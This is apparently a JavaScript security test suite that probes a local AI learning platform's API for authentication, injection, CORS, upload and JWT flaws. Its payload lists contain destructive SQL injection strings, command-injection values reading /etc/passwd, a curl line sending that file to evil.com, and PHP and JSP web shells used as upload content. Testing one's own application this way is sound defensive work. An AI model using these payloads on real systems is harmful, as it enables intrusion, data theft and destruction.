// Security Testing Suite for AI Learning Platform
const axios = require('axios');
const { expect } = require('chai');

class SecurityTester {
  constructor(baseUrl = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
    this.client = axios.create({
      baseURL: baseUrl,
      timeout: 10000,
      validateStatus: () => true // Don't throw on error status codes
    });
  }

  // Authentication and Authorization Tests
  async testAuthenticationFlaws() {
    console.log('🔐 Testing Authentication and Authorization...');

    const results = {
      weakPasswords: [],
      sessionManagement: [],
      authorization: []
    };

    // Test weak password acceptance
    const weakPasswords = [
      '123456',
      'password',
      'admin',
      'test',
      '123',
      '',
      'qwerty'
    ];

    for (const password of weakPasswords) {
      try {
        const response = await this.client.post('/api/auth/register', {
          email: `test-${Date.now()}@example.com`,
          password: password
        });

        if (response.status === 200 || response.status === 201) {
          results.weakPasswords.push({
            password,
            vulnerability: 'Weak password accepted',
            severity: 'high'
          });
        }
      } catch (error) {
        // Expected to fail - good security practice
      }
    }

    // Test session management
    try {
      const loginResponse = await this.client.post('/api/auth/login', {
        email: 'test@example.com',
        password: 'testpassword123'
      });

      if (loginResponse.data.token) {
        // Test session fixation
        const insecureEndpoints = [
          '/api/user/profile',
          '/api/user/progress',
          '/api/ask'
        ];

        for (const endpoint of insecureEndpoints) {
          const response = await this.client.get(endpoint, {
            headers: {
              'Authorization': `Bearer ${loginResponse.data.token}`
            }
          });

          if (response.status === 200) {
            // Check for secure session handling
            const headers = response.headers;
            if (!headers['set-cookie'] || !headers['set-cookie'].some(cookie =>
              cookie.includes('HttpOnly') && cookie.includes('Secure')
            )) {
              results.sessionManagement.push({
                endpoint,
                vulnerability: 'Insecure session cookies',
                severity: 'medium'
              });
            }
          }
        }
      }
    } catch (error) {
      results.sessionManagement.push({
        vulnerability: 'Login endpoint potentially vulnerable',
        severity: 'medium',
        error: error.message
      });
    }

    return results;
  }

  // Input Validation and XSS Tests
  async testInputValidation() {
    console.log('🛡️ Testing Input Validation...');

    const results = {
      xss: [],
      sqlInjection: [],
      commandInjection: [],
      fileUpload: []
    };

    // XSS Payloads
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '\"><script>alert("XSS")</script>',
      "'\"><script>alert('XSS')</script>",
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input autofocus onfocus=alert("XSS")>',
      '<select onfocus=alert("XSS") autofocus>'
    ];

    for (const payload of xssPayloads) {
      try {
        const response = await this.client.post('/api/ask', {
          question: payload,
          subject: 'general',
          level: 'beginner'
        });

        if (response.data.answer &&
            (response.data.answer.includes('<script>') ||
             response.data.answer.includes('javascript:') ||
             response.data.answer.includes('onerror='))) {
          results.xss.push({
            payload,
            vulnerability: 'XSS payload reflected in response',
            severity: 'critical',
            response: response.data.answer.substring(0, 200)
          });
        }
      } catch (error) {
        // Check if error messages leak information
        if (error.response && error.response.data &&
            (error.response.data.error || '').includes('<script>')) {
          results.xss.push({
            payload,
            vulnerability: 'XSS in error message',
            severity: 'high',
            error: error.response.data.error
          });
        }
      }
    }

    // SQL Injection Payloads
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; SELECT * FROM users; --",
      "' UNION SELECT username, password FROM users --",
      "'; INSERT INTO users VALUES('hacker', 'password'); --",
      "' OR 1=1 --",
      "admin'--",
      "' OR 'x'='x",
      "1'; DELETE FROM users WHERE 1=1 --",
      "'; EXEC xp_cmdshell('dir'); --"
    ];

    for (const payload of sqlPayloads) {
      try {
        const response = await this.client.post('/api/ask', {
          question: payload,
          subject: 'general'
        });

        // Check for SQL error messages
        if (response.data.error &&
            (response.data.error.toLowerCase().includes('sql') ||
             response.data.error.toLowerCase().includes('mysql') ||
             response.data.error.toLowerCase().includes('postgres') ||
             response.data.error.toLowerCase().includes('syntax'))) {
          results.sqlInjection.push({
            payload,
            vulnerability: 'SQL error information disclosure',
            severity: 'high',
            error: response.data.error
          });
        }
      } catch (error) {
        if (error.response && error.response.data &&
            error.response.data.error &&
            error.response.data.error.toLowerCase().includes('sql')) {
          results.sqlInjection.push({
            payload,
            vulnerability: 'SQL injection vulnerability',
            severity: 'critical',
            error: error.response.data.error
          });
        }
      }
    }

    // Command Injection Payloads
    const commandPayloads = [
      '; ls -la',
      '; cat /etc/passwd',
      '; whoami',
      '; id',
      '; pwd',
      '| whoami',
      '&& whoami',
      '`whoami`',
      '$(whoami)',
      '; curl http://evil.com/steal?data=$(cat /etc/passwd)'
    ];

    for (const payload of commandPayloads) {
      try {
        const response = await this.client.post('/api/generate/quiz', {
          subject: payload,
          questionCount: 5
        });

        // Check for command output in response
        if (response.data.answer &&
            (response.data.answer.includes('root') ||
             response.data.answer.includes('uid=') ||
             response.data.answer.includes('etc/passwd'))) {
          results.commandInjection.push({
            payload,
            vulnerability: 'Command injection successful',
            severity: 'critical',
            response: response.data.answer.substring(0, 200)
          });
        }
      } catch (error) {
        // Analyze error responses for command execution traces
      }
    }

    return results;
  }

  // API Security Tests
  async testAPISecurity() {
    console.log('🔌 Testing API Security...');

    const results = {
      rateLimiting: [],
      cors: [],
      informationDisclosure: [],
      authenticationBypass: []
    };

    // Test Rate Limiting
    const rapidRequests = [];
    for (let i = 0; i < 100; i++) {
      rapidRequests.push(
        this.client.post('/api/ask', {
          question: `Rate limit test ${i}`,
          subject: 'general'
        })
      );
    }

    try {
      const responses = await Promise.all(rapidRequests);
      const rateLimitedResponses = responses.filter(res => res.status === 429);

      if (rateLimitedResponses.length === 0) {
        results.rateLimiting.push({
          vulnerability: 'No rate limiting implemented',
          severity: 'high',
          test: '100 rapid requests, none were rate limited'
        });
      } else {
        const rateLimitingRatio = rateLimitedResponses.length / responses.length;
        if (rateLimitingRatio < 0.1) {
          results.rateLimiting.push({
            vulnerability: 'Insufficient rate limiting',
            severity: 'medium',
            ratio: rateLimitingRatio,
            test: 'Only 10% of requests were rate limited'
          });
        }
      }
    } catch (error) {
      results.rateLimiting.push({
        vulnerability: 'Rate limiting test failed',
        severity: 'low',
        error: error.message
      });
    }

    // Test CORS Configuration
    const origins = [
      'http://evil.com',
      'https://malicious-site.net',
      'null',
      'http://localhost:8080'
    ];

    for (const origin of origins) {
      try {
        const response = await this.client.get('/api/subjects', {
          headers: { 'Origin': origin }
        });

        const corsHeader = response.headers['access-control-allow-origin'];
        if (corsHeader && (corsHeader === '*' || corsHeader === origin)) {
          results.cors.push({
            vulnerability: 'Overly permissive CORS policy',
            severity: 'medium',
            allowedOrigin: corsHeader,
            testOrigin: origin
          });
        }
      } catch (error) {
        // CORS headers might prevent the request - which is good
      }
    }

    // Test for Information Disclosure
    const sensitiveEndpoints = [
      '/api/admin/users',
      '/api/config',
      '/api/health',
      '/api/status',
      '/.env',
      '/package.json',
      '/server.js'
    ];

    for (const endpoint of sensitiveEndpoints) {
      try {
        const response = await this.client.get(endpoint);

        if (response.status === 200) {
          results.informationDisclosure.push({
            endpoint,
            vulnerability: 'Sensitive endpoint accessible',
            severity: 'high',
            contentType: response.headers['content-type']
          });
        }
      } catch (error) {
        // 404 or 403 is expected and good
      }
    }

    return results;
  }

  // File Upload Security Tests
  async testFileUploadSecurity() {
    console.log('📁 Testing File Upload Security...');

    const results = {
      maliciousFiles: [],
      sizeLimits: [],
      typeValidation: []
    };

    // Test malicious file uploads
    const maliciousFiles = [
      {
        name: 'malicious.php',
        type: 'application/x-php',
        content: '<?php system($_GET["cmd"]); ?>'
      },
      {
        name: 'script.js',
        type: 'application/javascript',
        content: '<script>alert("XSS");</script>'
      },
      {
        name: 'shell.jsp',
        type: 'application/x-jsp',
        content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
      },
      {
        name: '../../../etc/passwd',
        type: 'text/plain',
        content: 'malicious content'
      }
    ];

    for (const file of maliciousFiles) {
      try {
        const formData = new FormData();
        const blob = new Blob([file.content], { type: file.type });
        formData.append('file', blob, file.name);

        const response = await this.client.post('/api/upload', formData, {
          headers: {
            'Content-Type': 'multipart/form-data'
          }
        });

        if (response.status === 200 || response.status === 201) {
          results.maliciousFiles.push({
            filename: file.name,
            vulnerability: 'Malicious file upload accepted',
            severity: 'critical',
            response: response.data
          });
        }
      } catch (error) {
        // File upload rejected - good security practice
      }
    }

    // Test file size limits
    const largeFileSize = 100 * 1024 * 1024; // 100MB
    const largeFile = new Blob(['x'.repeat(largeFileSize)], { type: 'image/jpeg' });

    try {
      const formData = new FormData();
      formData.append('file', largeFile, 'large.jpg');

      const response = await this.client.post('/api/upload', formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        },
        maxContentLength: 50 * 1024 * 1024, // 50MB limit
        maxBodyLength: 50 * 1024 * 1024
      });

      if (response.status === 200 || response.status === 201) {
        results.sizeLimits.push({
          vulnerability: 'No file size limit enforced',
          severity: 'medium',
          uploadedSize: largeFileSize
        });
      }
    } catch (error) {
      // Large file rejected - good security practice
    }

    return results;
  }

  // Authentication Bypass Tests
  async testAuthenticationBypass() {
    console.log('🔓 Testing Authentication Bypass...');

    const results = {
      jwtFlaws: [],
      sessionFixation: [],
      directAccess: []
    };

    // Test JWT token manipulation
    const fakeTokens = [
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
      'fake.jwt.token',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.signature',
      '',
      null,
      undefined
    ];

    for (const token of fakeTokens) {
      try {
        const response = await this.client.get('/api/user/profile', {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });

        if (response.status === 200) {
          results.jwtFlaws.push({
            token: token ? 'provided' : 'missing',
            vulnerability: 'Invalid JWT token accepted',
            severity: 'critical',
            responseData: response.data
          });
        }
      } catch (error) {
        // Unauthorized response is expected
      }
    }

    // Test direct access to protected resources
    const protectedEndpoints = [
      '/api/user/profile',
      '/api/user/progress',
      '/api/dashboard/stats',
      '/api/admin/users'
    ];

    for (const endpoint of protectedEndpoints) {
      try {
        const response = await this.client.get(endpoint);

        if (response.status === 200) {
          results.directAccess.push({
            endpoint,
            vulnerability: 'Protected endpoint accessible without authentication',
            severity: 'high'
          });
        }
      } catch (error) {
        // 401 or 403 is expected
      }
    }

    return results;
  }

  // Generate comprehensive security report
  async generateSecurityReport() {
    console.log('🔍 Running comprehensive security assessment...');

    const authResults = await this.testAuthenticationFlaws();
    const inputResults = await this.testInputValidation();
    const apiResults = await this.testAPISecurity();
    const uploadResults = await this.testFileUploadSecurity();
    const bypassResults = await this.testAuthenticationBypass();

    const allResults = {
      timestamp: new Date().toISOString(),
      target: this.baseUrl,
      summary: {
        totalVulnerabilities: 0,
        critical: 0,
        high: 0,
        medium: 0,
        low: 0
      },
      categories: {
        authentication: authResults,
        inputValidation: inputResults,
        apiSecurity: apiResults,
        fileUpload: uploadResults,
        authenticationBypass: bypassResults
      }
    };

    // Calculate summary
    Object.values(allResults.categories).forEach(category => {
      Object.values(category).forEach(vulnerabilities => {
        if (Array.isArray(vulnerabilities)) {
          vulnerabilities.forEach(vuln => {
            allResults.summary.totalVulnerabilities++;
            allResults.summary[vuln.severity]++;
          });
        }
      });
    });

    return allResults;
  }
}

// Export for use in testing
module.exports = SecurityTester;

// Example usage
if (require.main === module) {
  async function runSecurityTests() {
    const tester = new SecurityTester('http://localhost:3000');

    try {
      const report = await tester.generateSecurityReport();

      console.log('\n🚨 SECURITY ASSESSMENT REPORT');
      console.log('================================');
      console.log(`Target: ${report.target}`);
      console.log(`Timestamp: ${report.timestamp}`);
      console.log(`Total Vulnerabilities: ${report.summary.totalVulnerabilities}`);
      console.log(`Critical: ${report.summary.critical}`);
      console.log(`High: ${report.summary.high}`);
      console.log(`Medium: ${report.summary.medium}`);
      console.log(`Low: ${report.summary.low}`);

      console.log('\n📋 DETAILED FINDINGS:');
      console.log('=====================');

      Object.entries(report.categories).forEach(([category, results]) => {
        const vulnerabilities = Object.values(results).flat();
        if (vulnerabilities.length > 0) {
          console.log(`\n${category.toUpperCase()}:`);
          vulnerabilities.forEach(vuln => {
            console.log(`  [${vuln.severity.toUpperCase()}] ${vuln.vulnerability}`);
            if (vuln.endpoint) console.log(`    Endpoint: ${vuln.endpoint}`);
            if (vuln.payload) console.log(`    Payload: ${vuln.payload}`);
          });
        }
      });

    } catch (error) {
      console.error('Security testing failed:', error.message);
    }
  }

  runSecurityTests();
}